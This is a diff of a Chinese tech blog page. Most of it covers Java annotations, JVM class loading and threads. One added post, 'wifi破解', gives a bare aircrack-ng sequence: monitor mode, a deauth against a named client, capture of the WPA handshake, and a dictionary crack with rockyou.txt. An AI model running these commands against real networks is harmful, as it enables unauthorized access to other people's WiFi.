+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-03 13:45:11" itemprop="dateModified" datetime="2019-09-03T13:45:11+08:00">2019-09-03</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/jdk/" itemprop="url" rel="index"><span itemprop="name">jdk</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * @author 无心</span><br><span class="line"> * @date 2018-05-08 10:10:10</span><br><span class="line"> * 文档id</span><br><span class="line"> */</span><br><span class="line">@Inherited</span><br><span class="line">@Documented</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Target(ElementType.FIELD)</span><br><span class="line">public @interface DocId &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Documented</span><br><span class="line">@Inherited</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="line">public @interface Document &#123;</span><br><span class="line">    //必须为小写</span><br><span class="line">    String index();</span><br><span class="line"></span><br><span class="line">    //分片数量</span><br><span class="line">    int shards() default 5;</span><br><span class="line"></span><br><span class="line">    //副本数</span><br><span class="line">    int replicas() default 1;</span><br><span class="line"></span><br><span class="line">    //数据刷新</span><br><span class="line">    String refreshInterval() default &quot;1s&quot;;</span><br><span class="line"></span><br><span class="line">    //存储类型</span><br><span class="line">    String indexStoreType() default &quot;fs&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>{———-}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author 无心</span><br><span class="line"> * @date 2018-05-08 10:10:10</span><br><span class="line"> * 注解获取封装</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class FieldUtil &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(String [] args) throws IllegalAccessException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        MedCheckDoc medCheckDoc = new MedCheckDoc();</span><br><span class="line"></span><br><span class="line">        String string = getDocType(medCheckDoc.getClass());</span><br><span class="line">        System.err.print(string);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocIndex(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.index();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static int getDocShards(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.shards();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static int getDocReplicas(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.replicas();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocRefreshInterval(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.refreshInterval();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocIndexStoreType(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.indexStoreType();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取DocId被注解字段</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocId(Class clazz) throws NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        List&lt;Field&gt; result = new ArrayList&lt;Field&gt;();</span><br><span class="line">        for (Field field:fields)&#123;</span><br><span class="line">            if(field.getAnnotation(DocId.class)!=null)&#123;</span><br><span class="line">                result.add(field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(result.size()!=1)&#123;</span><br><span class="line">            throw new NoSuchFieldException(&quot;未找到注解&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return result.get(0).getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取DocType被注解字段</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocType(Class clazz) throws NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        List&lt;Field&gt; result = new ArrayList&lt;Field&gt;();</span><br><span class="line">        for (Field field:fields)&#123;</span><br><span class="line">            if(field.getAnnotation(DocType.class)!=null)&#123;</span><br><span class="line">                result.add(field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(result.size()!=1)&#123;</span><br><span class="line">            throw new NoSuchFieldException(&quot;未找到注解&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result.get(0).getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取DocSearchKeyWord被注解字段</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static List&lt;String&gt; getDocKeyword(Class clazz) throws NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        List&lt;String&gt; list = new ArrayList&lt;&gt;();</span><br><span class="line">        for (Field field:fields)&#123;</span><br><span class="line">            if(field.getAnnotation(DocSearchKeyWord.class)!=null)&#123;</span><br><span class="line">                list.add(field.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(list.size() ==0)&#123;</span><br><span class="line">            throw new NoSuchFieldException(&quot;未找到注解&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return list;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    
+      
+
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2019/05/26/jdk/jdk-model/" rel="bookmark">jdk内存模型</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2019/03/16/jdk/jdk-tree-2/" rel="bookmark">二叉树的深度遍历与广度遍历</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/12/11/jdk/jdk-nio/" rel="bookmark">Java NIO浅析【转】</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/11/01/jdk/jdk-tree/" rel="bookmark">java 红黑树</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-list/" rel="bookmark">列表List</a></div>
+      
+    </li>
+  
+  </ul>
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/wifi-violence/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="上善若水">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水の技术簿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/03/24/hack/wifi-violence/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/19/index.html">wifi破解</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2018-10-15 16:31:42" itemprop="dateModified" datetime="2018-10-15T16:31:42+08:00">2018-10-15</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/hack/" itemprop="url" rel="index"><span itemprop="name">hack</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>利用网卡监控模式<br>监控wifi热点 .然后强制断开用户与路由连接.利用用户与路由四次握手机会获取握手包.然后跑字典</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># airmon-ng</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># airmon-ng start wlan0</span><br><span class="line">#wlan0为 上一个命令的Interface</span><br><span class="line"></span><br><span class="line"># airodump-ng wlan0mon</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon</span><br><span class="line">-c 6:表示信道6 (ch)</span><br><span class="line"></span><br><span class="line"># aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon</span><br><span class="line"></span><br><span class="line"># airmon-ng stop wlan0mon</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap</span><br><span class="line">#跑字典</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    
+      
+
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/art-infiltration/" rel="bookmark">渗透的艺术</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/ssh-violence/" rel="bookmark">ssh远程登陆破解</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/filter-xss/" rel="bookmark">Filter安全过滤高级最终行（XSS攻击）</a></div>
+      
+    </li>
+  
+  </ul>
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/jdk/jdk-map/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1334,7 +1769,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-annotation/" rel="bookmark">自定义注解</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-list/" rel="bookmark">列表List</a></div>
       
     </li>
   
@@ -1562,7 +1997,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-annotation/" rel="bookmark">自定义注解</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-list/" rel="bookmark">列表List</a></div>
       
     </li>
   
@@ -1792,515 +2227,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-annotation/" rel="bookmark">自定义注解</a></div>
-      
-    </li>
-  
-  </ul>
-
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/jdk/jvm-classloader/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="上善若水">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水の技术簿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/03/24/jdk/jvm-classloader/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/19/index.html">类加载过程</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-03-31 23:37:53" itemprop="dateModified" datetime="2019-03-31T23:37:53+08:00">2019-03-31</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
-
-                
-                
-                  ，
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/jdk/" itemprop="url" rel="index"><span itemprop="name">jdk</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>类加载过程</p>
-<p>加载–》验证–》准备—》解析—》初始化—》使用—-》卸载</p>
-<p>其中 在准备阶段完成 成员变量初始值赋值 0 、 0.0之类</p>
-<p><strong>  加载 </strong></p>
-<p>1、将java字节码以二进制的方式读入到jvm内存中，然后将二进制数据流按照字节码规范解析成jvm内部的运行时数据结构<br>2、对外暴露加载结构 更广泛的加载类</p>
-<pre><code>(1) 从本地文件系统中读取
-
-(2) 从网络上加载（典型应用：java Applet）
-
-(3) 从jar，zip，war等压缩文件中加载
-
-(4) 通过动态将java源文件动态编译产生（jsp的动态编译）
-
-(5) 通过程序直接生成。
-</code></pre><p><strong>  验证 </strong></p>
-<p>1、文件格式验证（这一步会与装载阶段交叉进行），元数据验证，字节码验证，符号引用验证（这个阶段的验证往往会与解析阶段交叉进行）。</p>
-<p><strong>  准备 </strong></p>
-<pre><code>int,byte,char,long,float,double 默认初始值为0
-
-boolean 为false（在jvm内部用int表示boolean，因此初始值为0）
-
-reference类型为null
-
-对于final static基本类型或者String类型，则直接采用常量值（这实际上是在编译阶段就已经处理好了）。
-</code></pre><p><strong>  解析 </strong></p>
-<p>1、类的常量池中的类，字段，方法，接口的符号引用，将他们替换成直接引用的过程</p>
-<pre><code>CONSTANT_Class_info
-CONSTANT_Fieldref_info
-CONSTANT_Methodref_info
-CONSTANT_InterfaceMethodref_info
-</code></pre><p><strong> 初始化 </strong></p>
-<p>1、根据用户程序中的初始化语句为类的静态变量赋予正确的初始值</p>
-<p>2、执行时机</p>
-<pre><code>(1) 通过new关键字实例化对象、读取或设置类的静态变量、调用类的静态方法(对应new,getstatic,putstatic,invokespecial这四条字节码指令）。
-
-(2) 通过反射方式执行以上行为时。
-
-(3) 初始化子类的时候，会触发父类的初始化。
-
-(4) 作为程序入口直接运行时的主类。
-</code></pre><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>类加载器：启动类加载器、扩展类加载器、应用类加载器、自定义加载器</p>
-<p>自定义加载器：<br>比如tomcat：CommonClassloader—CatalinaClassLoader、ShareClassLoader、WebappClassLoader、JspClassLoader</p>
-<p><strong>  双亲委派模型  </strong></p>
-<p>1、当一个类触发init方法进行初始化、先判断是否已经加载、没有的话交由父类classloader进行初始化、父类不存在使用启动类加载器初始化、父类的加载器加载失败则使用自己的classloader加载启动</p>
-
-          
-        
-      
-    </div>
-
-    
-      
-
-  <div class="popular-posts-header">相关文章</div>
-  <ul class="popular-posts">
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jvm-memory-structure/" rel="bookmark">jvm内存结构</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jvm-memory-recovery/" rel="bookmark">jvm内存回收</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jvm-total/" rel="bookmark">jvm内存一条线路</a></div>
-      
-    </li>
-  
-  </ul>
-
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/jdk/jdk-thread/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="上善若水">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水の技术簿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/03/24/jdk/jdk-thread/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/19/index.html">线程</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-09-03 13:45:11" itemprop="dateModified" datetime="2019-09-03T13:45:11+08:00">2019-09-03</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
-
-                
-                
-                  ，
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/jdk/" itemprop="url" rel="index"><span itemprop="name">jdk</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>实现线程方式 继承Thread类 和 实现 Runnable接口</p>
-<p>调用start执行线程、调用run 会在主线程执行</p>
-<p>线程五个状态：新建、就绪、运行、阻塞（等待）、结束</p>
-<p>等待分为：有限期等待和无限期等待<br>    有时间声明的属有限期等待、没有时间的要通过notify notifyall唤醒</p>
-<p>Thread.sleep()</p>
-<pre><code>monitor 持有锁
-</code></pre><p>Object.wait()</p>
-<pre><code>monitor 释放锁
-</code></pre><p>Thread.interrupt()</p>
-<p>Thread.isInterrupt()</p>
-<p>join 等待子线程执行完毕</p>
-<pre><code>A线程中等待B线程执行完毕 使用方式：b.join()
-在线程池中join方法不适用
-join()似乎要在thread.start()后才能有效，而线程池则直接用threadPool.execute(runnable or thread),用join()无效。
-</code></pre><p>volatile关键字：轻量级线程并发行变量可见、数据在CPU RAM中直接读取、并维护更新</p>
-<p>yield 让出线程给 同等级线程执行时间</p>
-<p><strong>  线程四种 </strong></p>
